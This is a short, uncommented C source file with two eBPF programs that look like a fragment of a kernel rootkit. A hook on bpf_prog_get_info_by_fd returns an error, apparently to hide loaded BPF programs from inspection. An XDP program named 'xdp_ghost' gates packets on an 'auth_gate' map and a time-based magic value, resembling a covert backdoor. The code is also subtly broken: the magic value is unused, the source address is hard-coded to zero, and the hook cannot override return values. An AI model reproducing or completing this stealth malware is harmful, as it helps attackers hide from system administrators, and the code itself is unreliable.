#include <linux/bpf.h>
#include <linux/types.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char _license[] SEC("license") = "GPL";

struct task_struct {
    int pid;
    int tgid;
} __attribute__((preserve_access_index));

struct {
    __uint(type, BPF_MAP_TYPE_LRU_HASH);
    __uint(max_entries, 64);
    __type(key, u32);
    __type(value, u64);
} auth_gate SEC(".maps");

SEC("fentry/bpf_prog_get_info_by_fd")
int BPF_PROG(mask_bpf, int fd, struct bpf_prog_info *info) {
    return -2;
}

SEC("xdp")
int xdp_ghost(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;
    
    u64 now = bpf_ktime_get_ns() / 30000000000;
    u32 magic = (u32)(now ^ 0x5F5F5F5F);

    u32 src_ip = 0; 
    u64 *valid = bpf_map_lookup_elem(&auth_gate, &src_ip);
    
    if (!valid) return XDP_DROP;
    return XDP_PASS;
}
